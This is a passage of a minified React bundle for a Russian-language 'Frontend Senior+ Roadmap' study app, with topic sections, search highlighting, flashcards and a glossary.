n===-1?e:g.jsxs(g.Fragment,{children:[e.slice(0,n),g.jsx("mark",{className:"search-highlight",children:e.slice(n,n+t.length)}),e.slice(n+t.length)]})}function lc({topic:e,sectionColor:t,highlight:n,defaultOpen:r=!1}){const[o,l]=ce.useState(r),i=to[e.level]||to[2];return g.jsxs("div",{className:"topic-row",children:[g.jsxs("button",{className:"topic-header",onClick:()=>l(!o),children:[g.jsx("span",{className:"topic-chevron",children:o?"▾":"▸"}),g.jsx("span",{className:"topic-name",children:n?Wl(e.name,n):e.name}),g.jsxs("span",{className:"topic-badges",children:[e.score!=null&&g.jsxs("span",{className:"topic-score",title:"Оценка",children:[e.score,"/5"]}),g.jsxs("span",{className:"topic-level",style:{background:i.color+"22",color:i.color,borderColor:i.color+"44"},children:[e.level," — ",i.label]})]})]}),o&&g.jsx("div",{className:"topic-content",children:g.jsx(ic,{text:e.content})})]})}function ic({text:e}){if(!e)return g.jsx("p",{className:"placeholder",children:"Контент будет добавлен позже"});const t=e.split(`
`),n=[];let r=!1,o=[],l=0;return t.forEach((i,s)=>{if(i.startsWith("```")){r?(n.push(g.jsx("pre",{children:o.join(`
`)},l++)),o=[],r=!1):r=!0;return}if(r){o.push(i);return}if(i.trim()===""){n.push(g.jsx("div",{className:"spacer"},l++));return}let a=i.replace(/\*\*(.+?)\*\*/g,"<strong>$1</strong>").replace(/`([^`]+)`/g,"<code>$1</code>").replace(/^• /,"‣ ");n.push(g.jsx("p",{className:"content-line",dangerouslySetInnerHTML:{__html:a}},l++))}),r&&o.length&&n.push(g.jsx("pre",{children:o.join(`
`)},l++)),g.jsx("div",{className:"formatted-content",children:n})}function Wf({section:e,defaultCollapsed:t=!1,onSelect:n=void 0}){const[r,o]=ce.useState(t),l=e.topics.length,i=e.topics.filter(c=>c.score!=null),s=i.length?(i.reduce((c,f)=>c+f.score,0)/i.length).toFixed(1):null;function a(){n?n(e.id):o(!r)}return g.jsxs("div",{className:"section-block",children:[g.jsxs("button",{className:"section-header",onClick:a,style:{"--accent":e.color},children:[g.jsxs("div",{className:"section-left",children:[g.jsx("span",{className:"section-icon",children:e.icon}),g.jsxs("div",{children:[g.jsx("h2",{className:"section-title",children:e.title}),g.jsxs("span",{className:"section-meta",children:[l," тем",s?` · Средняя: ${s}/5`:""]})]})]}),g.jsx("span",{className:"section-chevron",children:r?"▸":"▾"})]}),!r&&g.jsx("div",{className:"section-topics",children:e.topics.map((c,f)=>g.jsx(lc,{topic:c,sectionColor:e.color},f))})]})}function Bf({query:e,sections:t}){const n=e.toLowerCase(),r=[];return t.forEach(o=>{const l=o.topics.filter(i=>i.name.toLowerCase().includes(n)||i.content&&i.content.toLowerCase().includes(n));l.length>0&&r.push({section:o,topics:l})}),r.length===0?g.jsxs("p",{className:"search-empty",children:["Ничего не найдено по запросу «",e,"»"]}):g.jsx(g.Fragment,{children:r.map(({section:o,topics:l})=>g.jsxs("div",{className:"section-block",children:[g.jsx("div",{className:"section-header",style:{"--accent":o.color},children:g.jsxs("div",{className:"section-left",children:[g.jsx("span",{className:"section-icon",children:o.icon}),g.jsxs("div",{children:[g.jsx("h2",{className:"section-title",children:o.title}),g.jsxs("span",{className:"section-meta",children:[l.length," совпадений"]})]})]})}),g.jsx("div",{className:"section-topics",children:l.map((i,s)=>g.jsx(lc,{topic:i,sectionColor:o.color,highlight:e,defaultOpen:!0},s))})]},o.id))})}function Vf({sections:e}){const[t,n]=ce.useState("all"),[r,o]=ce.useState(0),[l,i]=ce.useState(!1),s=[];e.forEach(f=>{f.topics.forEach(m=>{m.content&&(t==="all"||t===f.id)&&s.push({...m,sectionTitle:f.title,sectionIcon:f.icon,sectionColor:f.color})})});const a=s[r];if(!a)return g.jsx("p",{children:"Нет карточек"});const c=to[a.level]||to[2];return g.jsxs("div",{className:"flashcard-mode",children:[g.jsxs("div",{className:"flash-filter",children:[g.jsxs("select",{value:t,onChange:f=>{n(f.target.value),o(0),i(!1)},children:[g.jsx("option",{value:"all",children:"Все разделы"}),e.map(f=>g.jsxs("option",{value:f.id,children:[f.icon," ",f.title]},f.id))]}),g.jsxs("span",{className:"flash-counter",children:[r+1," / ",s.length]})]}),g.jsx("div",{className:`flash-card ${l?"flipped":""}`,onClick:()=>i(!l),children:l?g.jsx("div",{className:"flash-back",children:g.jsx(ic,{text:a.content})}):g.jsxs("div",{className:"flash-front",children:[g.jsxs("span",{className:"flash-section",style:{color:a.sectionColor},children:[a.sectionIcon," ",a.sectionTitle]}),g.jsx("span",{className:"flash-level",style:{color:c.color},children:c.label}),g.jsx("h3",{className:"flash-question",children:a.name}),g.jsx("span",{className:"flash-hint",children:"Нажми, чтобы увидеть ответ"})]})}),g.jsxs("div",{className:"flash-nav",children:[g.jsx("button",{disabled:r===0,onClick:()=>{o(f=>f-1),i(!1)},children:"← Назад"}),g.jsx("button",{onClick:()=>{o(Math.floor(Math.random()*s.length)),i(!1)},children:"🎲 Случайная"}),g.jsx("button",{disabled:r>=s.length-1,onClick:()=>{o(f=>f+1),i(!1)},children:"Далее →"})]})]})}function $s({term:e,highlight:t}){return g.jsxs("div",{className:"term-row",children:[g.jsx("div",{className:"term-name",children:t?Wl(e.name,t):e.name}),e.definition&&g.jsx("div",{className:"term-def",children:t?Wl(e.definition,t):e.definition}),g.jsxs("div",{className:"term-source",children:[g.jsxs("span",{className:"term-section-badge",style:{color:e.sectionColor},children:[e.sectionIcon," ",e.sectionTitle]}),g.jsxs("span",{className:"term-topic",children:["· ",e.topicName]})]})]})}function bf({sections:e}){const[t,n]=ce.useState(""),[r,o]=ce.useState("all"),l=Uf(e),i=t.trim().toLowerCase(),s=l.filter(f=>{const m=!i||f.name.toLowerCase().includes(i)||f.definition.toLowerCase().includes(i),h=r==="all"||f.sectionId===r;return m&&h}),a=[],c=new Map;return s.forEach(f=>{if(!c.has(f.sectionId)){const m={id:f.sectionId,title:f.sectionTitle,color:f.sectionColor,icon:f.sectionIcon,terms:[]};c.set(f.sectionId,m),a.push(m)}c.get(f.sectionId).terms.push(f)}),g.jsxs("div",{className:"glossary",children:[g.jsxs("div",{className:"glossary-controls",children:[g.jsxs("div",{className:"search-bar",children:[g.jsx("svg",{className:"search-icon",width:"16",height:"16",viewBox:"0 0 16 16",fill:"currentColor",children:g.jsx("path",{d:"M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.868-3.834zm-5.242 1.156a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"})}),g.jsx("input",{type:"search",placeholder:"Поиск по терминам и определениям...",value:t,onChange:f=>n(f.target.value),className:"search-input"}),t&&g.jsx("button",{className:"search-clear",onClick:()=>n(""),title:"Очистить",children:"✕"})]}),g.jsxs("nav",{className:"section-tabs",style:{marginTop:"10px"},children:[g.jsx("button",{className:`section-tab ${r==="all"?"active":""}`,onClick:()=>o("all"),children:"Все разделы"}),e.map(f=>g.jsxs("button",{className:`section-tab ${r===f.id?"active":""}`,onClick:()=>o(r===f.id?"all":f.id),style:r===f.id?{"--tab-color":f.color}:{},children:[g.jsx("span",{className:"section-tab-icon",children:f.icon}),f.title]},f.id))]})]}),g.jsxs("p",{className:"glossary-stats",children:[s.length," ",s.length===1?"термин":s.length<5?"термина":"терминов"]}),s.length===0?g.jsxs("p",{className:"search-empty",children:["Ничего не найдено по запросу «",t,"»"]}):r!=="all"?g.jsx("div",{className:"glossary-group",children:s.map((f,m)=>g.jsx($s,{term:f,highlight:i},m))}):a.map(f=>g.jsxs("div",{className:"glossary-group",children:[g.jsxs("div",{className:"glossary-group-header",style:{"--accent":f.color},children:[g.jsx("span",{children:f.icon}),g.jsx("span",{children:f.title}),g.jsxs("span",{className:"glossary-count",children:[f.terms.length," терм."]})]}),f.terms.map((m,h)=>g.jsx($s,{term:m,highlight:i},h))]},f.id))]})}function Jf(){const[e,t]=ce.useState("roadmap"),[n,r]=ce.useState("list"),[o,l]=ce.useState(""),[i,s]=ce.useState(null),a=Ye.reduce((m,h)=>m+h.topics.length,0),c=e==="roadmap"&&o.trim().length>0,f=i?Ye.filter(m=>m.id===i):Ye;return g.jsxs("div",{className:"app",children:[g.jsxs("header",{className:"app-header",children:[g.jsxs("div",{className:"header-content",children:[g.jsx("h1",{className:"app-title",children:"Frontend Senior+ Roadmap"}),g.jsxs("p",{className:"app-sub",children:[Ye.length," разделов · ",a," тем"]})]}),g.jsxs("div",{className:"header-controls",children:[g.jsxs("nav",{className:"tabs",children:[g.jsx("button",{className:`tab ${e==="roadmap"?"active":""}`,onClick:()=>{t("roadmap"),l("")},children:"📋 Темы"}),g.jsx("button",{className:`tab ${e==="cards"?"active":""}`,onClick:()=>{t("cards"),l("")},children:"🃏 Карточки"}),g.jsx("button",{className:`tab ${e==="glossary"?"active":""}`,onClick:()=>{t("glossary"),l("")},children:"📚 Справочник"})]}),e==="roadmap"&&g.jsxs("div",{className:"view-toggle",children:[g.jsx("button",{className:`view-btn ${n==="list"?"active":""}`,onClick:()=>r("list"),title:"Список",children:g.jsxs("svg",{width:"16",height:"16",viewBox:"0 0 16 16",fill:"currentColor",children:[g.jsx("rect",{x:"1",y:"2",width:"14",height:"2",rx:"1"}),g.jsx("rect",{x:"1",y:"7",width:"14",height:"2",rx:"1"}),g.jsx("rect",{x:"1",y:"12",width:"14",height:"2",rx:"1"})]})}),g.jsx("button",{className:`view-btn ${n==="grid"?"active":""}`,onClick:()=>r("grid"),title:"Сетка",children:g.jsxs("svg",{width:"16",height:"16",viewBox:"0 0 16 16",fill:"currentColor",children:[g.jsx("rect",{x:"1",y:"1",width:"6",height:"6",rx:"1"}),g.jsx("rect",{x:"9",y:"1",width:"6",height:"6",rx:"1"}),g.jsx("rect",{x:"1",y:"9",width:"6",height:"6",rx:"1"}),g.jsx("rect",{x:"9",y:"9",width:"6",height:"6",rx:"1"})]})})]})]}),e==="roadmap"&&g.jsxs("nav",{className:"section-tabs",children:[g.jsx("button",{className:`section-tab ${i===null?"active":""}`,onClick:()=>s(null),children:"Все"}),Ye.map(m=>g.jsxs("button",{className:`section-tab ${i===m.id?"active":""}`,onClick:()=>s(i===m.id?null:m.id),style:i===m.id?{"--tab-color":m.color}:{},children:[g.jsx("span",{className:"section-tab-icon",children:m.icon}),m.title]},m.id))]}),e==="roadmap"&&g.jsxs("div",{className:"search-bar",children:[g.jsx("svg",{className:"search-icon",width:"16",height:"16",viewBox:"0 0 16 16",fill:"currentColor",children:g.jsx("path",{d:"M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.868-3.834zm-5.242 1.156a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"})}),g.jsx("input",{type:"search",placeholder:"Поиск по темам...",value:o,onChange:m=>l(m.target.value),className:"search-input"}),o&&g.jsx("button",{className:"search-clear",onClick:()=>l(""),title:"Очистить",children:"✕"})]})]}),g.jsx("main",{className:`app-main ${e==="roadmap"&&!c&&n==="grid"&&!i?"view-grid":""}`,children:e==="roadmap"?c?g.jsx(Bf,{query:o.trim(),sections:f}):f.map(m=>g.jsx(Wf,{section:m,defaultCollapsed:n==="grid"&&!i,onSelect:n==="grid"&&!i?s:void 0},m.id)):e==="cards"?g.jsx(Vf,{sections:Ye}):g.jsx(bf,{sections:Ye})},c?`search-${o}`:`${n}-${i}`)]})}Ko.createRoot(document.getElementById("root")).render(g.jsx(Tc.StrictMode,{children:g.jsx(Jf,{})}));
